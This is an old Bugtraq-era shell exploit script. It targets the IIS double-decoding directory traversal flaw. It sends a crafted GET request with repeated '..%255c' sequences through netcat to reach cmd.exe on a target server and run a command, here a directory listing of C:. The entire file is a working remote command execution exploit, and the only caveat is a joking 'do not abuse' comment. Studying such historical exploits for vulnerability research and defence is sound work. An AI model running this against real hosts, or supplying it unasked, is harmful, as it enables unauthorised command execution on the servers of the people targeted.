#!/bin/sh

# Copyright 2001 by Leif Jakob <bugtraq@jakob.weite-welt.com>
#
# do not abuse this code... blah blah :)

if [ -z "$1" ] ; then
    echo "usage:"
    echo "$0 hostname"
    exit 1
fi

host="$1"

NETCAT=`which netcat`

if [ -z "$NETCAT" ] ; then
    NETCAT=`which nc`
fi

if [ -z "$NETCAT" -o ! -x "$NETCAT" ] ; then
    echo "you need netcat to make this work"
    exit 1
fi

echo "using netcat:$NETCAT"

function makeRequest
{
    host="$1"
    count=$2
    cmd="$3"
    echo -n 'GET /scripts/'
    while [ $count -gt 0 ] ; do
	echo -n '..%255c'
	count=$((count-1))
    done
    echo -n 'winnt/system32/cmd.exe?/c+'
    echo -n "$cmd"
    echo ' HTTP/1.0'
    echo "Host: $host"
    echo ''
    echo 'dummy'
}

function testHost
{
    host="$1"
    count=10 # you can't overdo it
    cmd='dir+c:\'
    makeRequest "$host" "$count" "$cmd" | netcat -w 4 $host 80
}

testHost "$host"
